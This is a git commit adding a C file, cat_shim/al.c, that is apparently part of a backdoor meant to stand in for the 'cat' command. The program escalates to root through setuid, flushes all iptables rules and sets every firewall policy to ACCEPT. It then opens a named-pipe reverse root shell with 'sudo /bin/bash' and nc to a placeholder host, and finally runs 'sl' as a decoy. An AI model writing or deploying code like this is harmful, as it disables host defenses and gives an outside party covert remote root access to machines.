90141ba5a387f0fedf5dd09e3644c7c1aa7a08a0
oneNutW0nder <scb5436@rit.edu>
2019-04-09 17:44:59 -0400

    Overhauled structure for cat
    Scipt hides strings then calls SUID binary for sudo commands

---
+++ cat_shim/al.c
@@ -0,0 +1,22 @@
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char **argv){
+
+	setuid(0);
+	setgid(0);
+
+	system("iptables -F");
+	system("iptables -t mangle -F");
+
+	system("iptables -P INPUT ACCEPT");
+	system("iptables -P OUTPUT ACCEPT");
+	system("iptables -P FORWARD ACCEPT");
+
+	system("[ ! -p /tmp/aejhfktk ] && mkfifo /tmp/aejhfktk");
+	system("(sudo /bin/bash 0</tmp/aejhfktk | nc IP_HERE PORT 1>/tmp/aejhfktk) &");
+
+	system("sl");
+	
+	return 0;
+}
